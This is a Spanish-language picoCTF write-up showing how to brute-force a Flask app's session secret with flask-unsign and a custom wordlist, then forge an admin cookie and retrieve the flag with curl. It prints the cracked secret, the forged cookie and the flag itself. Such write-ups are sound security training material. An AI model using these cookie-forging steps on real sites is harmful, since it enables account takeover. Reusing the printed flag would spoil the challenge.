## Descripción 
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/1e4bd835ad3e7fe776d49e7b8cc280c1/server.py) [http://mercury.picoctf.net:35697/](http://mercury.picoctf.net:35697/)

Hint:
1. How secure is a flask cookie?
## Solución 1

Abrimos el archivo python y nos damos cuenta que vamos a tener que usar un ataque de diccionario para sacar un secret y ponerlo en la cookie. Primero entramos al sitio y ponemos snickerdoodle y sacamos la cookie, después vamos al archivo python y sacamos las palabras que tenemos para sacar el wordlist, hacemos un archivo con esas palabras y sacamos el secret, hacemos un flask-unsign y obtenemos la bandera 

```
Cookie: eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-95oQ.6rH5_27F5cN77C1GyO2NMXylytA

Creamos archivo cookies.txt con las pabalbras a crackear

descargamos flask-unsign y proseguimos con los comandos

┌──(.venv)─(kali㉿kali)-[~]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-9vug.on97vOS-9SVpV7Ey9jjwz9ojpBk" --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'

Con el comando anterior usamos las wordlists para saber cual es nuestra clave secreta 

┌──(.venv)─(kali㉿kali)-[~]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "peanut butter"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-95oQ.6rH5_27F5cN77C1GyO2NMXylytA

Con el comando anterior metemos la cookie inicial con el secret "peanut butter"

┌──(.venv)─(kali㉿kali)-[~]
└─$ curl -s http://mercury.picoctf.net:35697/display -H "Cookie: session= eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-95oQ.6rH5_27F5cN77C1GyO2NMXylytA" | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_22fe0842}</code></p>

Y con este útlimo hacemos un curl y un grep para sacar la bandera 

flag: picoCTF{pwn_4ll_th3_cook1E5_22fe0842}
```
